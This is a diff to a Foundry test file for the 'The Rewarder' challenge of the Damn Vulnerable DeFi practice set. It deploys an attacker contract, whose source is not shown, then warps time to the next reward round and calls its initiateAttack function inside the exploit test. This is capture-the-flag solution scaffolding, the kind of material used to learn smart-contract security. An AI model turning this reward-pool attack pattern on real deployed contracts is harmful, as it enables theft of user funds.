@@ -10,6 +10,8 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+import {TheRewarderAttacker} from "../../../src/Contracts/the-rewarder/TheRewarderAttacker.sol";
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -18,6 +20,8 @@ contract TheRewarder is Test {
     FlashLoanerPool internal flashLoanerPool;
     TheRewarderPool internal theRewarderPool;
     DamnValuableToken internal dvt;
+    TheRewarderAttacker internal theRewarderAttacker;
+
     address payable[] internal users;
     address payable internal attacker;
     address payable internal alice;
@@ -81,13 +85,24 @@ contract TheRewarder is Test {
         assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
         assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far
 
+        // Lets setup the rewarderAttacker exploit contract 
+        theRewarderAttacker = new TheRewarderAttacker(address(theRewarderPool.rewardToken()),address(flashLoanerPool), address(dvt), address(theRewarderPool), attacker);
+
+        
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
+    //TheRewarderAttacker(address _rewardTokenAddress, address _flashLoanerPoolAddres, address _damnVulnerableTokenAddress, address _theRewarderPoolAddress, address _owner)
 
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        vm.warp(block.timestamp + 5 days); // Neede to warp to the next round
+        theRewarderAttacker.initiateAttack();
+        vm.prank(attacker);
+        // theRewarderAttacker.finishAttack();
+
 
         /**
          * EXPLOIT END *
